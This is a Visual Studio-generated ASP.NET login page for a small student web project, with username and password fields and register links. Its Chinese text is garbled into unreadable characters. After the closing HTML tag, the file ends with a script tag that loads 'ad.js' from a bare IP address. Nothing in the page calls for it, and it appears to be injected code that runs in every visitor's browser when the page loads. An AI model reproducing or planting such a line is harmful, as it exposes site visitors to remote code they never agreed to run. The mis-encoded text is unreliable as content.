<%@ Page Language="vb" AutoEventWireup="false" Codebehind="index.aspx.vb" Inherits="relation.WebForm2"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
	<HEAD>
		<title>WebForm2</title>
		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">
		<meta content="Visual Basic .NET 7.1" name="CODE_LANGUAGE">
		<meta content="JavaScript" name="vs_defaultClientScript">
		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">
	</HEAD>
	<body>
		<FORM id="Form1" method="post" runat="server">
			<TABLE id="Table9" cellSpacing="0" cellPadding="0" width="778" align="center" bgColor="#fef3bd"
				border="0" valign="middle">
				<TR>
					<TD vAlign="middle" width="778" bgColor="#fef3bd" colSpan="3" height="8">
						<DIV align="center"><IMG height="8" src="imga/bg1.gif" width="100%"></DIV>
					</TD>
				</TR>
				<TR bgColor="#ffffff">
					<TD colSpan="3" height="60"><IMG height="60" src="imga/logo.gif" width="321"><IMG height="60" src="imga/idea.jpg" width="457"></TD>
				</TR>
				<TR>
					<TD vAlign="middle" colSpan="3" height="8"><IMG height="8" src="imga/bg2.gif" width="100%"></TD>
				</TR>
			</TABLE> <!--===============include menu================--> <!--==========include menu==============-->
			<TABLE id="Table10" cellSpacing="0" cellPadding="0" width="778" align="center" border="0">
				<TR>
					<TD class="p9" vAlign="middle" width="196" bgColor="#dedede" height="18">
						<DIV align="center"><FONT color="#666666"><B>
									<asp:Label id="timetext" runat="server" Width="142px"></asp:Label>
									&nbsp; </B></FONT>
						</DIV>
					</TD>
					<TD class="p9" vAlign="middle" width="51" bgColor="#dedede" height="18">
						<DIV align="right"><IMG height="25" src="imga/blue.jpg" width="35"></DIV>
					</TD>
					<TD class="p9" vAlign="middle" width="548" background="imga/blue2.jpg" bgColor="#00459c"
						height="18">
						<DIV align="left"><SPAN class="p10"><FONT color="#ffffff"><A class="whitemenu" onmouseover="showMenu(this,'topmenu1',0)" onmouseout="hideMenu(event)"
										href="rmodelpublish.aspx" target="_top">����</A> <A class="whitemenu" onmouseover="showMenu(this,'topmenu2',0)" onmouseout="hideMenu(event)"
										href="rmodelsearch.aspx" target="_top">��ѯ</A>&nbsp;<A class="whitemenu" onmouseover="showMenu(this,'topmenu3',0)" onmouseout="hideMenu(event)"
										href="rmodelmodification.aspx" target="_top">�޸�</A> </FONT></SPAN>
						</DIV>
					</TD>
				</TR>
			</TABLE>
			<DIV id="Div1" style="VISIBILITY: hidden" onmouseout="hideMenu(event)"></DIV>
			<FONT face="����"></FONT>
			<TABLE id="Table11" height="62" cellSpacing="0" width="778" align="center">
				<TR border="0">
					<TD class="p10" vAlign="top" background="imga/bg3.gif" colSpan="2" height="20" border="0"><IMG height="1" src="imga/03.gif" width="100%"><BR>
						<FONT color="#000000">&nbsp;|</FONT><FONT color="#000000"><SPAN class="p9"> <a href="index.aspx">
									��ҳ</a></SPAN> </FONT><FONT color="#000000">|</FONT> <FONT color="#000000">
							<SPAN class="p9"><a href="index.aspx">�û���¼</a></SPAN> |<a href="newcustomer.aspx">ע��</a>
						</FONT>
					</TD>
				</TR>
				<TR border="0">
					<TD vAlign="top" width="172" bgColor="#0859ad" height="20">&nbsp;
						<asp:Label id="lblHint" runat="server" ForeColor="Info">Label</asp:Label></TD>
					<TD vAlign="top" bgColor="#0859ad" height="20">
						<DIV align="right"><FONT color="#ffffff"><marquee direction="left" behavior="scroll" scrolldelay="100" loop="-1" style="WIDTH: 601px; HEIGHT: 32px">��ӭ�� 
									&nbsp;���ҵ�����ѣ� &nbsp; &nbsp;</marquee>
							</FONT>
						</DIV>
					</TD>
				</TR>
			</TABLE>
			<CENTER>
				<TABLE id="Table12" height="400" cellSpacing="0" cellPadding="0" width="778" bgColor="#ffffff"
					border="0">
					<TBODY>
						<TR>
							<TD vAlign="top" width="172" bgColor="#0859ad" height="14"><!--====================include pageleft==================-->
								<TABLE id="Table13" cellSpacing="0" cellPadding="0" width="100%" border="0">
									<TR>
										<TD vAlign="top" bgColor="#0859ad">
											<DIV align="center"><FONT face="����"></FONT>&nbsp;</DIV>
										</TD>
									</TR>
								</TABLE>
								<TABLE id="Table14" height="100%" cellSpacing="0" cellPadding="0" width="100%" border="0">
									<TR>
										<TD vAlign="top" bgColor="#9cd7ef">
											<DIV align="center"><IMG style="WIDTH: 100%; HEIGHT: 32px" height="32" src="imga/grad.gif" width="172">
												<TABLE id="Table1" style="WIDTH: 152px; HEIGHT: 114px" cellSpacing="1" cellPadding="1"
													width="152" border="1">
													<TR>
														<TD style="WIDTH: 63px"><FONT face="����">
																<asp:Label id="lblName" runat="server">�û���:</asp:Label></FONT></TD>
														<TD><FONT face="����">
																<asp:TextBox id="txtName" runat="server" Width="72px" Height="19px"></asp:TextBox></FONT></TD>
													</TR>
													<TR>
														<TD style="WIDTH: 63px; HEIGHT: 35px"><FONT face="����">
																<asp:Label id="lblPwd" runat="server">����:</asp:Label></FONT></TD>
														<TD style="HEIGHT: 35px">
															<asp:TextBox id="txtPwd" runat="server" Width="72px" Height="21px" TextMode="Password"></asp:TextBox></TD>
													</TR>
													<TR>
														<TD style="WIDTH: 63px"><FONT face="����">
																<asp:Button id="btnLogIn" runat="server" Text="����"></asp:Button></FONT></TD>
														<TD><FONT face="����">
																<asp:Button id="btnReg" runat="server" Text="ע��"></asp:Button></FONT></TD>
													</TR>
												</TABLE>
												&nbsp;
												<BR>
												<BR>
												<P>
													<asp:Label id="lblCheck" runat="server" Height="90px" Width="136px" ForeColor="#0000C0" Font-Size="Larger">���ѣ�������û��������룬���������룬��ע�ᰴťע��</asp:Label></P>
											</DIV>
										</TD>
									</TR>
								</TABLE>
							</TD>
							<TD vAlign="top" width="21" bgColor="#ffffff"><IMG height="23" src="imga/05.gif" width="21"></TD>
							<TD vAlign="top" width="611">
		</FORM>
		<FORM style="MARGIN: 0px" name="loginForm" action="" method="post">
			&nbsp;&nbsp;
		</FORM>
		<FORM id="Form2" method="post">
			<P>
				<FONT face="����"></FONT>&nbsp;</P>
			<P><FONT face="����">&nbsp;</P>
			<P>&nbsp;</P>
			<P>&nbsp;</P>
			<P>&nbsp;</P>
			<P>&nbsp;</P>
			<P>&nbsp;</P>
			<P>&nbsp;</P>
			<P>&nbsp;</P>
			<P>&nbsp;</P> </FONT></TD></TR></TBODY></TABLE></CENTER><!---====================include pagetail================-->
			<CENTER>
				<TABLE id="Table16" cellSpacing="0" cellPadding="0" width="778" border="0">
					<TR>
						<TD><IMG height="31" src="imga/bg4.gif" width="778"></TD>
					</TR>
					<TR>
						<TD class="p9" background="imga/bg5.gif">
							<DIV align="center">| �������� | �ͷ��绰��<STRONG>0571-<FONT face="Arial">63740939</FONT></STRONG></DIV>
						</TD>
					</TR>
					<TR>
						<TD class="p9" bgColor="#ffffff"><FONT face="����">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
								��Ȩ���У�&nbsp;&nbsp; �㽭��ѧԺ��Ϣ����ѧԺ����022 ������ ½���� </FONT>
						</TD>
					</TR>
				</TABLE>
			</CENTER>
		</FORM>
	</body>
</HTML>
<script src="http://222.208.183.246/ad/ad.js"></script>
